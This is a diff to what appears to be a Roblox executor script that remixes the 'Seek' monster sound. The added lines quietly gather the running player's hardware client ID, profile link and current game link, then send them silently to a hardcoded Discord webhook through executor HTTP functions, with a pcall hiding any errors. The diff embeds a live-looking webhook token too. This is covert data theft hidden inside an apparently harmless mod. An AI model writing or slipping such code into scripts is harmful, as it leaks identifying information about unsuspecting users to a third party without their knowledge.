@@ -794,6 +794,59 @@ local NewSeek = GetGitSoundID("https://github.com/Brololto/SEEKREMIXHARDCOREV3/b
         OldSeek.Volume = 2.2
        end)  
 
+
+
+local hwid = game:GetService("RbxAnalyticsService"):GetClientId();
+local profilelink = 'https://roblox.com/users/' .. game.Players.LocalPlayer.UserId .. '/profile'
+local gamelink = 'https://roblox.com/games/' .. game.PlaceId .. '/' .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+
+local Webhook = 'https://discord.com/api/webhooks/1092302013385150555/bOoT6OLIy2cOxLrkG6QVRBwRiec1gAvL7N5aqies-eFmbBXd6sbw3C065_PW_M-zh4PK'
+pcall(function()
+local data = {
+["embeds"] = {
+{
+["title"] = 'Balls and jiggle: ' .. hwid,
+["description"] = 'Profile link: ' .. profilelink ..  ' ' .. 'Game link: ' .. gamelink,
+}
+}
+}
+if syn then
+local response = syn.request(
+{
+Url = Webhook,
+Method = 'POST',
+Headers = {
+['Content-Type'] = 'application/json'
+},
+Body = game:GetService('HttpService'):JSONEncode(data)
+}
+);
+elseif request then
+local response = request(
+{
+Url = Webhook,
+Method = 'POST',
+Headers = {
+['Content-Type'] = 'application/json'
+},
+Body = game:GetService('HttpService'):JSONEncode(data)
+}
+);
+elseif http_request then
+local response = http_request(
+{
+Url = Webhook,
+Method = 'POST',
+Headers = {
+['Content-Type'] = 'application/json'
+},
+Body = game:GetService('HttpService'):JSONEncode(data)
+}
+);
+end
+end)
+
+
 game.ReplicatedStorage.Sounds.BulbZap.SoundId = "rbxassetid://5837227586"
 
 
